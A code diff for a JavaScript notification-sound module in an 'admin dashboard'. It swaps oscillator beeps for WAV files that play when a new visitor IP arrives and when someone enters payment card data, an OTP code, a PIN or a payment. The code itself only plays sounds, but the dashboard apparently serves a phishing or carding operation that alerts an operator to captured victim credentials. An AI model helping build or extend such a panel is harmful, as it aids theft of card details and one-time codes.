@@ -1,175 +1,146 @@
 // Notification Sounds for Admin Dashboard
 
-// Lazy-load audio context (created on first use to avoid Chrome warning)
-let audioContext = null;
+// Audio files paths
+const SOUNDS = {
+  newVisitor: '/assets/sounds/ip.wav',        // Sound for new visitor/IP
+  cardData: '/assets/sounds/data.wav',        // Sound for payment card data
+  otp: '/assets/sounds/otp.wav',              // Sound for OTP code (to be added)
+  pin: '/assets/sounds/pin.wav',              // Sound for PIN code (to be added)
+  payment: '/assets/sounds/payment.wav'       // Sound for payment submission (to be added)
+};
+
+// Pre-loaded audio elements
+const audioElements = {};
 
 /**
- * Get or create audio context (initialized after user interaction)
+ * Preload all audio files
  */
-const getAudioContext = () => {
-  if (!audioContext && typeof window !== 'undefined') {
-    try {
-      audioContext = new (window.AudioContext || window.webkitAudioContext)();
-      
-      // Resume if suspended (Chrome autoplay policy)
-      if (audioContext.state === 'suspended') {
-        audioContext.resume();
-      }
-    } catch (error) {
-      console.warn('AudioContext not supported:', error);
-      return null;
-    }
+const preloadSounds = () => {
+  Object.entries(SOUNDS).forEach(([key, path]) => {
+    const audio = new Audio(path);
+    audio.preload = 'auto';
+    audio.volume = 0.7; // Default volume (70%)
+    audioElements[key] = audio;
+  });
+  console.log('🔊 Notification sounds preloaded');
+};
+
+/**
+ * Play audio file with fallback to synthetic sound
+ * @param {string} soundKey - Key from SOUNDS object
+ * @param {Function} fallbackFn - Fallback function if audio file not found
+ */
+const playSound = (soundKey, fallbackFn) => {
+  const audio = audioElements[soundKey];
+  
+  if (audio) {
+    // Clone audio to allow multiple simultaneous plays
+    const soundClone = audio.cloneNode();
+    soundClone.volume = audio.volume;
+    
+    soundClone.play().catch(error => {
+      console.warn(`Failed to play ${soundKey}:`, error);
+      // Use fallback synthetic sound
+      if (fallbackFn) fallbackFn();
+    });
+  } else {
+    console.warn(`Audio file not loaded for ${soundKey}, using fallback`);
+    if (fallbackFn) fallbackFn();
   }
-  return audioContext;
 };
 
 /**
- * Play a beep sound for new visitor
- * Simple notification tone
+ * Fallback synthetic sound generator (using Web Audio API)
  */
-export const playNewVisitorSound = () => {
-  const ctx = getAudioContext();
-  if (!ctx) return;
-  
-  const oscillator = ctx.createOscillator();
-  const gainNode = ctx.createGain();
-  
-  oscillator.connect(gainNode);
-  gainNode.connect(ctx.destination);
-  
-  oscillator.frequency.value = 800; // Hz
-  oscillator.type = 'sine';
-  
-  gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
-  gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
-  
-  oscillator.start(ctx.currentTime);
-  oscillator.stop(ctx.currentTime + 0.5);
-  
-  console.log('🔔 New visitor sound played');
-};
-
-/**
- * Play a special sound for credit card data entry
- * Two-tone alert sound
- */
-export const playCardDataSound = () => {
-  const ctx = getAudioContext();
-  if (!ctx) return;
-  
-  // First tone
-  const oscillator1 = ctx.createOscillator();
-  const gainNode1 = ctx.createGain();
-  
-  oscillator1.connect(gainNode1);
-  gainNode1.connect(ctx.destination);
-  
-  oscillator1.frequency.value = 1200; // Higher pitch
-  oscillator1.type = 'sine';
-  
-  gainNode1.gain.setValueAtTime(0.3, ctx.currentTime);
-  gainNode1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
-  
-  oscillator1.start(ctx.currentTime);
-  oscillator1.stop(ctx.currentTime + 0.3);
-  
-  // Second tone (delayed)
-  const oscillator2 = ctx.createOscillator();
-  const gainNode2 = ctx.createGain();
-  
-  oscillator2.connect(gainNode2);
-  gainNode2.connect(ctx.destination);
-  
-  oscillator2.frequency.value = 1000; // Slightly lower
-  oscillator2.type = 'sine';
-  
-  gainNode2.gain.setValueAtTime(0.3, ctx.currentTime + 0.35);
-  gainNode2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.7);
-  
-  oscillator2.start(ctx.currentTime + 0.35);
-  oscillator2.stop(ctx.currentTime + 0.7);
-  
-  console.log('💳 Card data sound played');
-};
-
-/**
- * Play a special sound for OTP entry
- * Triple beep pattern
- */
-export const playOTPSound = () => {
-  const ctx = getAudioContext();
-  if (!ctx) return;
-  
-  const beepTimes = [0, 0.2, 0.4];
-  
-  beepTimes.forEach((time, index) => {
-    const oscillator = ctx.createOscillator();
-    const gainNode = ctx.createGain();
+const createFallbackSound = (frequency, duration, type = 'sine') => {
+  try {
+    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioContext.createOscillator();
+    const gainNode = audioContext.createGain();
     
     oscillator.connect(gainNode);
-    gainNode.connect(ctx.destination);
+    gainNode.connect(audioContext.destination);
     
-    oscillator.frequency.value = 1400;
-    oscillator.type = 'sine';
+    oscillator.frequency.value = frequency;
+    oscillator.type = type;
     
-    gainNode.gain.setValueAtTime(0.25, ctx.currentTime + time);
-    gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + time + 0.15);
+    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration);
     
-    oscillator.start(ctx.currentTime + time);
-    oscillator.stop(ctx.currentTime + time + 0.15);
-  });
-  
-  console.log('🔐 OTP sound played');
+    oscillator.start(audioContext.currentTime);
+    oscillator.stop(audioContext.currentTime + duration);
+  } catch (error) {
+    console.warn('AudioContext not supported:', error);
+  }
 };
 
 /**
- * Play a special sound for PIN entry
- * Deep double beep
+ * Play sound for new visitor (uses ip.wav)
+ */
+export const playNewVisitorSound = () => {
+  console.log('🔔 Playing new visitor sound');
+  playSound('newVisitor', () => createFallbackSound(800, 0.5));
+};
+
+/**
+ * Play sound for credit card data entry (uses data.wav)
+ */
+export const playCardDataSound = () => {
+  console.log('💳 Playing card data sound');
+  playSound('cardData', () => {
+    createFallbackSound(1200, 0.3);
+    setTimeout(() => createFallbackSound(1000, 0.35), 350);
+  });
+};
+
+/**
+ * Play sound for OTP entry (uses otp.wav or fallback)
+ */
+export const playOTPSound = () => {
+  console.log('🔐 Playing OTP sound');
+  playSound('otp', () => {
+    [0, 0.2, 0.4].forEach(time => {
+      setTimeout(() => createFallbackSound(1400, 0.15), time * 1000);
+    });
+  });
+};
+
+/**
+ * Play sound for PIN entry (uses pin.wav or fallback)
  */
 export const playPINSound = () => {
-  const ctx = getAudioContext();
-  if (!ctx) return;
-  
-  const oscillator1 = ctx.createOscillator();
-  const gainNode1 = ctx.createGain();
-  
-  oscillator1.connect(gainNode1);
-  gainNode1.connect(ctx.destination);
-  
-  oscillator1.frequency.value = 600; // Lower pitch
-  oscillator1.type = 'square';
-  
-  gainNode1.gain.setValueAtTime(0.2, ctx.currentTime);
-  gainNode1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
-  
-  oscillator1.start(ctx.currentTime);
-  oscillator1.stop(ctx.currentTime + 0.25);
-  
-  // Second beep
-  const oscillator2 = ctx.createOscillator();
-  const gainNode2 = ctx.createGain();
-  
-  oscillator2.connect(gainNode2);
-  gainNode2.connect(ctx.destination);
-  
-  oscillator2.frequency.value = 600;
-  oscillator2.type = 'square';
-  
-  gainNode2.gain.setValueAtTime(0.2, ctx.currentTime + 0.3);
-  gainNode2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.55);
-  
-  oscillator2.start(ctx.currentTime + 0.3);
-  oscillator2.stop(ctx.currentTime + 0.55);
-  
-  console.log('🔑 PIN sound played');
+  console.log('🔑 Playing PIN sound');
+  playSound('pin', () => {
+    createFallbackSound(600, 0.25, 'square');
+    setTimeout(() => createFallbackSound(600, 0.25, 'square'), 300);
+  });
 };
 
 /**
- * Initialize audio context (must be called after user interaction)
+ * Play sound for payment submission (uses payment.wav or fallback)
+ */
+export const playPaymentSound = () => {
+  console.log('💰 Playing payment sound');
+  playSound('payment', () => createFallbackSound(1000, 0.6));
+};
+
+/**
+ * Initialize audio context and preload sounds
+ * Must be called after user interaction (to comply with browser autoplay policy)
  */
 export const initAudioContext = () => {
-  const ctx = getAudioContext();
-  if (ctx && ctx.state === 'suspended') {
-    ctx.resume();
-  }
+  preloadSounds();
+  console.log('✅ Audio system initialized');
+};
+
+/**
+ * Set volume for all notification sounds
+ * @param {number} volume - Volume level (0.0 to 1.0)
+ */
+export const setNotificationVolume = (volume) => {
+  const clampedVolume = Math.max(0, Math.min(1, volume));
+  Object.values(audioElements).forEach(audio => {
+    if (audio) audio.volume = clampedVolume;
+  });
+  console.log(`🔊 Volume set to ${Math.round(clampedVolume * 100)}%`);
 };
